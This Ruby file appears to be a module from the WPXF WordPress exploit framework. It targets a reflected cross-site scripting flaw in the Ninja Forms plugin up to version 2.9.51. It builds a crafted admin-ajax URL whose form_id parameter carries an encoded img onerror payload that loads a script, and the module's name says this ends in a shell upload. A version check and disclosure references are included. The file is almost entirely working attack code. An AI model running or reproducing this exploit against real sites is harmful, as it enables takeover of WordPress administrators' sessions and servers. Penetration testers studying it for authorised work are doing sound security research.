# frozen_string_literal: true

class Wpxf::Exploit::NinjaFormsReflectedXssShellUpload < Wpxf::Module
  include Wpxf::WordPress::ReflectedXss

  def initialize
    super

    update_info(
      name: 'Ninja Forms <= 2.9.51 Reflected XSS Shell Upload',
      author: [
        'Han Sahin', # Discovery
        'rastating'  # WPXF module
      ],
      references: [
        ['WPVDB', '8560'],
        ['URL', 'https://sumofpwn.nl/advisory/2016/multiple_cross_site_scripting_vulnerabilities_in_ninja_forms_wordpress_plugin.html']
      ],
      date: 'Jul 19 2016'
    )
  end

  def check
    check_plugin_version_from_readme('ninja-forms', '2.9.52')
  end

  def vulnerable_url
    wordpress_url_admin_ajax
  end

  def url_with_xss
    "#{vulnerable_url}?step=4&total_steps=6"\
    "&args[form_id]=#{Utility::Text.rand_numeric(2)}%3Cimg%20src%3dx%20onerror%3d#{xss_ascii_encoded_include_script}%3E"\
    "&args[filename]=#{Utility::Text.rand_alpha(5)}"\
    '&action=nf_download_all_subs'
  end
end
